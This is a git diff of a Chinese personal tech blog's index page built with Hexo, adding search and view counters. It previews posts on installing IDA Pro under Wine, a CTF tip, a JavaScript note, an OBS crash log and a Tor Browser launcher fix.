@@ -38,7 +38,7 @@
       hits: {"per_page":10},
       labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
     },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
     path: 'search.xml',
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     translation: {
@@ -162,9 +162,34 @@
     <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
 
   </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
   </ul>
 
 </nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
 </div>
     </header>
 
@@ -184,148 +209,6 @@
             
 
   <div class="posts-expand">
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
-    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/ida/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="LiHua">
-      <meta itemprop="description" content="One people that no one know">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="NoOne-hub">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/04/19/ida/" class="post-title-link" itemprop="url">ida7.2的安装</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2019-04-19 03:14:36" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">2019-04-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-10-30 17:23:19" itemprop="dateModified" datetime="2019-10-30T17:23:19+08:00">2019-10-30</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制</span>
-                  </a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E8%B0%83%E8%AF%95%E5%99%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">调试器</span>
-                  </a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>1.3k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>1 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="论如何在linux上安装ida7-2以及安装插件"><a href="#论如何在linux上安装ida7-2以及安装插件" class="headerlink" title="论如何在linux上安装ida7.2以及安装插件"></a>论如何在linux上安装ida7.2以及安装插件</h1><p>序言：原来用ida pro7.0用了好久，听说ida新出了挺多新功能，又折腾了一天？太菜了，我只是想试试新功能而已，ida pro 7.2已经有插件可以同步反汇编程序和反编译程序视图，还有折腾了以前没折腾成的插件。其实最想的还是ida pro7.3,听说可以撤销。<br>我没找到ida pro7.2 linux版本，所以便用win下的替代了。linux下跑windows的软件，在我看来，首选就是wine了</p>
-<p>这篇算是对我的那个环境配置的补充吧<br><a href="https://xz.aliyun.com/t/5749" target="_blank" rel="noopener">环境配置篇</a></p>
-<h2 id="安装wine"><a href="#安装wine" class="headerlink" title="安装wine"></a>安装wine</h2><p>这里建议呢，安装winehq-stable版本<br><a href="https://wiki.winehq.org/Download" target="_blank" rel="noopener">官网下载地址</a></p>
-<p>官网选后会有文档指示如何安装，这里我用的是debian发行版，所以我按我的来</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">wget -nc https://dl.winehq.org/wine-builds/winehq.key</span><br><span class="line">sudo apt-key add winehq.key</span><br></pre></td></tr></table></figure>
-<p>然后添加源，这里位置不尽相同,自行添加了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb https://dl.winehq.org/wine-builds/debian/ buster main</span><br></pre></td></tr></table></figure>
-<p>更新源</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure>
-<p>安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install --install-recommends winehq-stable</span><br></pre></td></tr></table></figure>
-
-<h2 id="下载ida-pro-7-2安装包"><a href="#下载ida-pro-7-2安装包" class="headerlink" title="下载ida pro 7.2安装包"></a>下载ida pro 7.2安装包</h2><p>这里相信各路神仙会有自己的办法的</p>
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里假设安装包为ida.exe</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine64 ida.exe</span><br></pre></td></tr></table></figure>
-<p>然后windows的安装操作各位会吧，一路next也可以，安装完会提示安装python，也安装<br>然后转到.wine目录下的ida目录下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/<span class="string">'Program Files'</span>/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
-<p>ls结果如下<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6go7eabbkj30f301gq2z.jpg" alt="20190829172100.png"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">'IDA 7.2'</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine64 ida</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wine64 ida64</span><br></pre></td></tr></table></figure>
-<p><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gobufrcmj30nj0h0abu.jpg" alt="20190829172516.png"><br>就运行成功了，到这里其实ida安装算完成了，可还要折腾插件啊，还有一些东西要折腾的可以参照<br><a href="https://bbs.pediy.com/thread-252208.htm" target="_blank" rel="noopener">看雪大佬的文章</a><br>就是做些替换工作</p>
-<p>对我来说方便的插件</p>
-<ol>
-<li>lazyida</li>
-<li>findcrypt</li>
-<li>HrDevHelper</li>
-<li>IDASkins</li>
-<li>hexlight<br>具体介绍可以从这里看到<a href="https://github.com/onethawt/idaplugins-list" target="_blank" rel="noopener">idaplugins-list</a></li>
-</ol>
-<p>这里比较难装的就是findcrypt了，最主要他要自己装个python库，我原来的思路是从虚拟机共享文件夹，然后设置环境变量来pip install yara<br>现在我发觉更简单的方法了,先按照原来的方法到</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wine64 easy_install-2.7.exe  yara</span><br><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/Python27/Scripts</span><br><span class="line">wine64 easy_install-2.7.exe  yara</span><br></pre></td></tr></table></figure>
-<p>这样便安装成了</p>
-<p>然后插件全放到ida7.2目录下的plugins里就成了<br>最终分享下界面</p>
-<h2 id="界面share"><a href="#界面share" class="headerlink" title="界面share"></a>界面share</h2><ol>
-<li><p>idaskin加hexlight高亮<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gotziju8j30rb0ipju8.jpg" alt="20190829174242.png"></p>
-</li>
-<li><p>HrDevHelper的树型图<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6govgs0voj317o0lsn1d.jpg" alt="20190829174408.png"></p>
-</li>
-<li><p>lazyida dump数据<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gox6396wj30fe02swef.jpg" alt="20190829174546.png"></p>
-</li>
-<li><p>至于findcrypt和lazyida的查找格式化字符串漏洞的就不截图了</p>
-</li>
-<li><p>dysnc我截图不了就算了，手机拍糊了点<br>最主要是要有一个好看的皮囊啊，我感觉这样配置下来比原来的好看多了</p>
-</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
         
   
   
@@ -387,7 +270,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/pwn_%E7%BB%86%E8%8A%82/" class="post-meta-item leancloud_visitors" data-flag-title="比赛细节注意点" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/pwn_%E7%BB%86%E8%8A%82/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/pwn_%E7%BB%86%E8%8A%82/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -413,7 +317,130 @@
 
       
           <h1 id="pwn-细节"><a href="#pwn-细节" class="headerlink" title="pwn_细节"></a>pwn_细节</h1><p>保护全开情况下考虑部分覆盖，不要全部覆盖，开了pie后三位是固定的</p>
+      
+    </div>
 
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="English">
+    <link itemprop="mainEntityOfPage" href="https://noone-hub.github.io/2019/04/19/ida/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="LiHua">
+      <meta itemprop="description" content="One people that no one know">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NoOne-hub">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/04/19/ida/" class="post-title-link" itemprop="url">ida7.2的安装</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-04-19 03:14:36" itemprop="dateCreated datePublished" datetime="2019-04-19T03:14:36+08:00">2019-04-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-10-30 17:23:19" itemprop="dateModified" datetime="2019-10-30T17:23:19+08:00">2019-10-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制</span>
+                  </a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/%E8%B0%83%E8%AF%95%E5%99%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">调试器</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span id="/2019/04/19/ida/" class="post-meta-item leancloud_visitors" data-flag-title="ida7.2的安装" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/ida/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/ida/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.3k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>1 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="论如何在linux上安装ida7-2以及安装插件"><a href="#论如何在linux上安装ida7-2以及安装插件" class="headerlink" title="论如何在linux上安装ida7.2以及安装插件"></a>论如何在linux上安装ida7.2以及安装插件</h1><p>序言：原来用ida pro7.0用了好久，听说ida新出了挺多新功能，又折腾了一天？太菜了，我只是想试试新功能而已，ida pro 7.2已经有插件可以同步反汇编程序和反编译程序视图，还有折腾了以前没折腾成的插件。其实最想的还是ida pro7.3,听说可以撤销。<br>我没找到ida pro7.2 linux版本，所以便用win下的替代了。linux下跑windows的软件，在我看来，首选就是wine了</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/19/ida/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -483,7 +510,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/jinja2/" class="post-meta-item leancloud_visitors" data-flag-title="jinja2问题记录" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/jinja2/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/jinja2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -578,7 +626,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/js/" class="post-meta-item leancloud_visitors" data-flag-title="web前端学习之js" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/js/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/js/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -604,7 +673,6 @@
 
       
           <h1 id="js学习"><a href="#js学习" class="headerlink" title="js学习"></a>js学习</h1><p>inerHtml跟inerText是不一样的，一个包含标签，一个不包含<br>字符串比较不要用===<br>inerText == 字符串可以<br>其余不行</p>
-
       
     </div>
 
@@ -680,7 +748,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/obs_pwn/" class="post-meta-item leancloud_visitors" data-flag-title="日常生活记录的漏洞点" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/obs_pwn/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/obs_pwn/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -706,7 +795,6 @@
 
       
           <h1 id="obs-pwn"><a href="#obs-pwn" class="headerlink" title="obs_pwn"></a>obs_pwn</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">└──╼ <span class="variable">$obs</span> </span><br><span class="line">Attempted path: share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale/en-US.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/locale.ini</span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark.qss</span><br><span class="line">info: CPU Name: Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz</span><br><span class="line">info: CPU Speed: 3480.843MHz</span><br><span class="line">info: Physical Cores: 2, Logical Cores: 4</span><br><span class="line">info: Physical Memory: 11782MB Total, 3611MB Free</span><br><span class="line">info: Kernel Version: Linux 5.2.0-2parrot1-amd64</span><br><span class="line">info: Distribution: <span class="string">"Parrot GNU/Linux"</span> <span class="string">"4.7"</span></span><br><span class="line">info: Window System: X11.0, Vendor: The X.Org Foundation, Version: 1.20.4</span><br><span class="line">info: Portable mode: <span class="literal">false</span></span><br><span class="line">Attempted path: share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/themes/Dark/no_sources.svg</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_clicked()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_advAudioProps_destroyed()</span><br><span class="line">QMetaObject::connectSlotsByName: No matching signal <span class="keyword">for</span> on_program_customContextMenuRequested(QPoint)</span><br><span class="line">info: OBS 0.0.1 (linux)</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: audio settings reset:</span><br><span class="line">	samples per sec: 44100</span><br><span class="line">	speakers:        2</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: Initializing OpenGL...</span><br><span class="line">info: Loading up OpenGL on adapter Intel Open Source Technology Center Mesa DRI Intel(R) HD Graphics 620 (Kaby Lake GT2) </span><br><span class="line">info: OpenGL loaded successfully, version 4.5 (Core Profile) Mesa 19.1.6, shading language 4.50</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: video settings reset:</span><br><span class="line">	base resolution:   1920x1080</span><br><span class="line">	output resolution: 1280x720</span><br><span class="line">	downscale filter:  Bicubic</span><br><span class="line">	fps:               30/1</span><br><span class="line">	format:            NV12</span><br><span class="line">	YUV mode:          601/Partial</span><br><span class="line">info: NV12 texture support not available</span><br><span class="line">info: Audio monitoring device:</span><br><span class="line">	name: Default</span><br><span class="line">	id: default</span><br><span class="line">info: ---------------------------------</span><br><span class="line">warning: Failed to load <span class="string">'en-US'</span> text <span class="keyword">for</span> module: <span class="string">'decklink-ouput-ui.so'</span></span><br><span class="line">libDeckLinkAPI.so: cannot open shared object file: No such file or directory</span><br><span class="line">info: No blackmagic support</span><br><span class="line">info: FFMPEG VAAPI supported</span><br><span class="line">info: VLC found, VLC video <span class="built_in">source</span> enabled</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info:   Loaded Modules:</span><br><span class="line">info:     vlc-video.so</span><br><span class="line">info:     text-freetype2.so</span><br><span class="line">info:     rtmp-services.so</span><br><span class="line">info:     obs-x264.so</span><br><span class="line">info:     obs-transitions.so</span><br><span class="line">info:     obs-outputs.so</span><br><span class="line">info:     obs-filters.so</span><br><span class="line">info:     obs-ffmpeg.so</span><br><span class="line">info:     linux-v4l2.so</span><br><span class="line">info:     linux-pulseaudio.so</span><br><span class="line">info:     linux-jack.so</span><br><span class="line">info:     linux-decklink.so</span><br><span class="line">info:     linux-capture.so</span><br><span class="line">info:     linux-alsa.so</span><br><span class="line">info:     image-source.so</span><br><span class="line">info:     frontend-tools.so</span><br><span class="line">info:     decklink-ouput-ui.so</span><br><span class="line">info: ---------------------------------</span><br><span class="line">info: ==== Startup complete ===============================================</span><br><span class="line">error: Service <span class="string">''</span> not found</span><br><span class="line">info: No scene file found, creating default scene</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Server name: <span class="string">'pulseaudio 13.0'</span></span><br><span class="line">info: pulse-input: Audio format: s16le, 44100 Hz, 2 channels</span><br><span class="line">info: pulse-input: Started recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: Switched to scene <span class="string">'Scene'</span></span><br><span class="line">warning: Failed to glob scene collections</span><br><span class="line">Attempted path: share/obs/obs-studio/images/overflow.png</span><br><span class="line">Attempted path: /usr/share/obs/obs-studio/images/overflow.png</span><br><span class="line">info: adding 23 milliseconds of audio buffering, total audio buffering is now 23 milliseconds (<span class="built_in">source</span>: Mic/Aux)</span><br><span class="line"></span><br><span class="line">^Cinfo: ==== Shutting down ==================================================</span><br><span class="line">info: Switched to scene <span class="string">'(null)'</span></span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_output.pci-0000_00_1f.3.analog-stereo.monitor'</span></span><br><span class="line">info: pulse-input: Got 125 packets with 32338 frames</span><br><span class="line">info: pulse-input: Stopped recording from <span class="string">'alsa_input.pci-0000_00_1f.3.analog-stereo'</span></span><br><span class="line">info: pulse-input: Got 271 packets with 118520 frames</span><br><span class="line">info: All scene data cleared</span><br><span class="line">info: ------------------------------------------------</span><br><span class="line">double free or corruption (out)</span><br><span class="line">Aborted</span><br></pre></td></tr></table></figure>
-
       
     </div>
 
@@ -770,7 +858,28 @@
                 </span>
             </span>
 
-          <br>
+          
+            <span id="/2019/04/19/parrot-linux/" class="post-meta-item leancloud_visitors" data-flag-title="parrot linux问题解决" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/04/19/parrot-linux/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/04/19/parrot-linux/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
             <span class="post-meta-item" title="Symbols count in article">
               <span class="post-meta-item-icon">
                 <i class="fa fa-file-word-o"></i>
@@ -795,64 +904,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="parot-linux系统问题总结"><a href="#parot-linux系统问题总结" class="headerlink" title="parot linux系统问题总结"></a>parot linux系统问题总结</h1><h2 id="出现命令行无法启动torbrowser-launcher"><a href="#出现命令行无法启动torbrowser-launcher" class="headerlink" title="出现命令行无法启动torbrowser-launcher"></a>出现命令行无法启动torbrowser-launcher</h2><p>这个问题我谷歌了很久，也没有得到有效的答案，所以只能自己动手测试，这是一个程序员基本功，我重新安装了好几次torbrowser-launcher，也没有得到解决，所以不是安装的问题，是机器环境的问题。</p>
-<p>在我的parrot sercurity上出现的错误是这样的：<br><big> + Tor Browser Launcher</p>
-<ul>
-<li>By Micah Lee, licensed under MIT</li>
-<li>version 0.3.1</li>
-<li><a href="https://github.com/micahflee/torbrowser-launcher" target="_blank" rel="noopener">https://github.com/micahflee/torbrowser-launcher</a></li>
-<li>Launching Tor Browser.</li>
-<li>Running /home/greenhand/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/start-tor-browser.desktop</li>
-<li>Launching ‘./Browser/start-tor-browser –detach’…</li>
-<li>QFileSystemWatcher::removePaths: list is empty</li>
-<li>QFileSystemWatcher::removePaths: list is empty </big></li>
-</ul>
-<p>解决方案可以直接往下划到底下，我先讲下处理这个问题思路<br>然后torbrowser-launcher没有启动,就这样就没了，我通过手动去官网下载了一波，解压后是可以运行的，然后将解压后的文件夹移动到tor默认位置那里，也就是上述出错的地方，tor浏览器居然运行不起来了，发现症结所在后，我创建了一个文件夹，然后将本身tor的文件夹移动到我新建的文件夹里，tor可以运行起来了，好吧，知道该怎么解决后就开始处理了</p>
-<h3 id="处理方案"><a href="#处理方案" class="headerlink" title="处理方案"></a>处理方案</h3><p>直接移动后会报错，然后根据报错位置找到了<br><strong>/usr/lib/python3/dist-packages/torbrowser_launcher/</strong><br>这里有一堆py文件，然后经过手动探寻可以查到common.py里存放了位置信息，所以我将common.py里的 <strong>tbb_local = ‘{0}/.local/share/torbrowser/‘.format(homedir)</strong> 改成 <strong>tbb_local = ‘{0}/.local/share/torbrowser/test/‘.format(homedir)</strong><br>加多一层目录，然后命令行就可以完美启动了！</p>
